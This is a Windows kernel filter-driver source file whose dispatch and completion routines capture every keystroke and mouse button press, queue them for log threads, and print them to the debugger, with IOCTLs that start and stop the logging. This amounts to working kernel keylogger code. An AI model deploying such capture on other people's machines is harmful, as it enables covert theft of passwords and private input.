#include "dispatch.h"
#include "debug.h"
#include "ioctl.h"

NTSTATUS LmbPassThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	const PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);

	switch (pStackLocation->MajorFunction) {
	case IRP_MJ_CREATE:
		DBG_PRINT("LmbPassThrough: Case IRP_MJ_CREATE\n");
		break;
	case IRP_MJ_CLOSE:
		DBG_PRINT("LmbPassThrough: Case IRP_MJ_CLOSE\n");
		break;
	case IRP_MJ_CLEANUP:
		DBG_PRINT("LmbPassThrough: Case IRP_MJ_CLEANUP\n");
		break;
	default:
		DBG_PRINTF("LmbPassThrough: Unknown case 0x%lx\n", pStackLocation->MajorFunction);
		break;
	}

	if (pDeviceObject->DeviceExtension) {
		const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->DeviceObject;

		// if current device is attached to a lower level device, its driver needs to be called
		if (pTargetDevice) {
			IoSkipCurrentIrpStackLocation(pIrp);

			DBG_PRINT("LmbPassThrough: Calling IoCallDriver\n");

			return IoCallDriver(pTargetDevice, pIrp);
		}
		else {
			DBG_PRINT("LmbPassThrough: No target device in device extension\n");
		}

	}

	const NTSTATUS ntStatus = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = ntStatus;
	IofCompleteRequest(pIrp, IO_NO_INCREMENT);

	return ntStatus;
}


BOOLEAN isLogging;

static NTSTATUS dispatchDevCtlLogStart(PDEVICE_OBJECT pDeviceObject);

NTSTATUS LmbDispatchDeviceControl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	const PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);
	
	if (pStackLocation->MajorFunction != IRP_MJ_DEVICE_CONTROL) {
		DBG_PRINT("LmbDispatchDeviceControl: Invalid major function\n");

		return STATUS_INVALID_PARAMETER;
	}

	#ifdef DBG
	const ULONG ioControlCode = pStackLocation->Parameters.DeviceIoControl.IoControlCode;
	#endif // DBG

	DBG_PRINTF("LmbDispatchDeviceControl: Received IO control code: 0x%lx\n", ioControlCode);

	NTSTATUS ntStatus = STATUS_SUCCESS;

	switch (pStackLocation->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_SEND_LOG_STATE:
		*(BOOLEAN*)pIrp->AssociatedIrp.SystemBuffer = isLogging;
		pIrp->IoStatus.Information = sizeof(BOOLEAN);
		DBG_PRINTF("LmbDispatchDeviceControl: Sent log state: %hhu\n", isLogging);
		break;
	case IOCTL_LOG_START:
		ntStatus = dispatchDevCtlLogStart(pDeviceObject);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("LmbDispatchDeviceControl: dispatchDevCtlLogStart failed: 0x%lx\n", ntStatus);
		}
		
		pIrp->IoStatus.Information = 0;
		break;
	case IOCTL_LOG_STOP:
		isLogging = FALSE;
		pIrp->IoStatus.Information = 0;
		DBG_PRINT("LmbDispatchDeviceControl: Stopped logging\n");
		break;
	default:
		ntStatus = STATUS_INVALID_PARAMETER;
	}

	pIrp->IoStatus.Status = ntStatus;
	IofCompleteRequest(pIrp, IO_NO_INCREMENT);

	return ntStatus;
}


static NTSTATUS dispatchKbdRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
static NTSTATUS dispatchMouRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

NTSTATUS LmbDispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	NTSTATUS ntStatus = STATUS_SUCCESS;

	CSHORT devType = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->Type;

	if (devType == FILE_DEVICE_KEYBOARD) {
		ntStatus = dispatchKbdRead(pDeviceObject, pIrp);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("LmbDispatchRead: dispatchKbdRead failed: 0x%lx\n", ntStatus);
		}

	}
	else if (devType == FILE_DEVICE_MOUSE) {
		ntStatus = dispatchMouRead(pDeviceObject, pIrp);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("LmbDispatchRead: dispatchKbdRead failed: 0x%lx\n", ntStatus);
		}

	}
	else {
		DBG_PRINT("LmbDispatchRead: Unknown device type\n");
		ntStatus = STATUS_DEVICE_DATA_ERROR;
	}

	return ntStatus;
}


static NTSTATUS dispatchDevCtlLogStart(PDEVICE_OBJECT pDeviceObject) {
	LARGE_INTEGER zeroTimeout = { .QuadPart = 0 };
	NTSTATUS ntStatus = STATUS_SUCCESS;
	
	// check if all threads (if any) have finished yet
	for (int i = 0; i < LOG_MAX; i++) {

		if (pLogThreads[i]) {
			ntStatus = KeWaitForSingleObject(pLogThreads[i], Executive, KernelMode, FALSE, &zeroTimeout);

			if (!NT_SUCCESS(ntStatus)) {
				DBG_PRINTF("dispatchDevCtlLogStart: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);

				return ntStatus;
			}
			else if (ntStatus == STATUS_TIMEOUT) {
				DBG_PRINT("dispatchDevCtlLogStart: KeWaitForSingleObject timeout\n");

				return ntStatus;
			}

		}

	}

	isLogging = TRUE;

	for (int i = 0; i < LOG_MAX; i++) {
		initBlockingQueue(&inputQueues[i], 0x10);
		ntStatus = startLogThread(pDeviceObject->DriverObject, i);

		if (NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("dispatchDevCtlLogStart: Started log thread %d\n", i);
		}
		else {
			DBG_PRINTF2("dispatchDevCtlLogStart: startLogThread failed for log thread %d: 0x%lx\n", i, ntStatus);

			return ntStatus;
		}

	}

	return ntStatus;
}


KSEMAPHORE readSemaphores[LOG_MAX];

static NTSTATUS completeKbdRead(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);

static NTSTATUS dispatchKbdRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	// start read operation
	// timeout needs to be zero at IRQL >= DISPATCH_LEVEL
	LARGE_INTEGER zeroTimeout = { .QuadPart = 0 };
	const NTSTATUS ntStatus = KeWaitForSingleObject(&readSemaphores[LOG_KBD], Executive, KernelMode, FALSE, &zeroTimeout);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("dispatchKbdRead: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}
	// completeRead has not finished yet
	else if (ntStatus == STATUS_TIMEOUT) {
		DBG_PRINT("dispatchKbdRead: KeWaitForSingleObject timeout\n");
		IoSkipCurrentIrpStackLocation(pIrp);
	}
	else {
		IoCopyCurrentIrpStackLocationToNext(pIrp);
		IoSetCompletionRoutine(pIrp, completeKbdRead, NULL, TRUE, TRUE, TRUE);
	}

	if (!pDeviceObject->DeviceExtension) {
		DBG_PRINT("dispatchKbdRead: No device extension\n");

		return STATUS_INVALID_PARAMETER;
	}

	const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->DeviceObject;

	if (!pTargetDevice) {
		DBG_PRINT("dispatchKbdRead: No target device\n");

		return STATUS_INVALID_PARAMETER;
	}

	// call lower level driver
	return IoCallDriver(pTargetDevice, pIrp);
}


static NTSTATUS completeKbdRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID pContext) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(pContext);

	const PKEYBOARD_INPUT_DATA pKbdInputData = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;

	if (pKbdInputData) {
		
		if (isLogging) {
			logKbdToDbg(pKbdInputData);
		}

		// if blocking queue is waiting, it needs at least one more item
		if (inputQueues[LOG_KBD].isWaiting) {

			// if logging is switched off, the blocking queue does not need to wait anymore
			if (!isLogging) {
				inputQueues[LOG_KBD].isWaiting = FALSE;
			}

			KbdListData* pKbdListData = (KbdListData*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KbdListData), KBD_LIST_DATA_TAG);

			if (pKbdListData) {
				pKbdListData->data = *pKbdInputData;
				const NTSTATUS ntStatus = addToBlockigQueue(&inputQueues[LOG_KBD], &pKbdListData->list);

				if (ntStatus != STATUS_SUCCESS) {
					DBG_PRINTF("completeKbdRead: addBlockigQueue failed: 0x%lx\n", ntStatus);

					ExFreePoolWithTag(pKbdListData, KBD_LIST_DATA_TAG);
				}

			}
			else {
				DBG_PRINT("completeKbdRead: ExAllocatePool2 failed\n");
			}

		}

	}
	else {
		DBG_PRINT("completeKbdRead: No data\n");
	}

	NTSTATUS ntStatus = pIrp->IoStatus.Status;

	if (pIrp->PendingReturned) {
		IoMarkIrpPending(pIrp);
		ntStatus = STATUS_PENDING;
	}

	// finish read operation
	KeReleaseSemaphore(&readSemaphores[LOG_KBD], 0, 1, FALSE);

	return ntStatus;
}


static NTSTATUS completeMouRead(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);

static NTSTATUS dispatchMouRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	// start read operation
	// timeout needs to be zero at IRQL >= DISPATCH_LEVEL
	LARGE_INTEGER zeroTimeout = { .QuadPart = 0 };
	const NTSTATUS ntStatus = KeWaitForSingleObject(&readSemaphores[LOG_MOU], Executive, KernelMode, FALSE, &zeroTimeout);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("dispatchMouRead: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}
	// completeRead has not finished yet
	else if (ntStatus == STATUS_TIMEOUT) {
		DBG_PRINT("dispatchMouRead: KeWaitForSingleObject timeout\n");
		IoSkipCurrentIrpStackLocation(pIrp);
	}
	else {
		IoCopyCurrentIrpStackLocationToNext(pIrp);
		IoSetCompletionRoutine(pIrp, completeMouRead, NULL, TRUE, TRUE, TRUE);
	}

	if (!pDeviceObject->DeviceExtension) {
		DBG_PRINT("dispatchMouRead: No device extension\n");

		return STATUS_INVALID_PARAMETER;
	}

	const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->DeviceObject;

	if (!pTargetDevice) {
		DBG_PRINT("dispatchMouRead: No target device\n");

		return STATUS_INVALID_PARAMETER;
	}

	// call lower level driver
	return IoCallDriver(pTargetDevice, pIrp);
}


static NTSTATUS completeMouRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID pContext) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(pContext);

	const PMOUSE_INPUT_DATA pMouInputData = (PMOUSE_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;

	if (pMouInputData) {
			
		// log just button strokes, no movement
		if (isLogging && pMouInputData->ButtonFlags) {
			logMouToDbg(pMouInputData);
		}

		// if blocking queue is waiting, it needs at least one more item
		// log just button strokes, no movement
		if (inputQueues[LOG_MOU].isWaiting && pMouInputData->ButtonFlags) {

			// if logging is switched off, the blocking queue does not need to wait anymore
			if (!isLogging) {
				inputQueues[LOG_MOU].isWaiting = FALSE;
			}

			MouListData* pMouListData = (MouListData*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MouListData), MOU_LIST_DATA_TAG);

			if (pMouListData) {
				pMouListData->data = *pMouInputData;
				const NTSTATUS ntStatus = addToBlockigQueue(&inputQueues[LOG_MOU], &pMouListData->list);

				if (ntStatus != STATUS_SUCCESS) {
					DBG_PRINTF("completeMouRead: addBlockigQueue failed: 0x%lx\n", ntStatus);

					ExFreePoolWithTag(pMouListData, MOU_LIST_DATA_TAG);
				}

			}
			else {
				DBG_PRINT("completeMouRead: ExAllocatePool2 failed\n");
			}

		}

	}
	else {
		DBG_PRINT("completeMouRead: No data\n");
	}

	NTSTATUS ntStatus = pIrp->IoStatus.Status;

	if (pIrp->PendingReturned) {
		IoMarkIrpPending(pIrp);
		ntStatus = STATUS_PENDING;
	}

	// finish read operation
	KeReleaseSemaphore(&readSemaphores[LOG_MOU], 0, 1, FALSE);

	return ntStatus;
}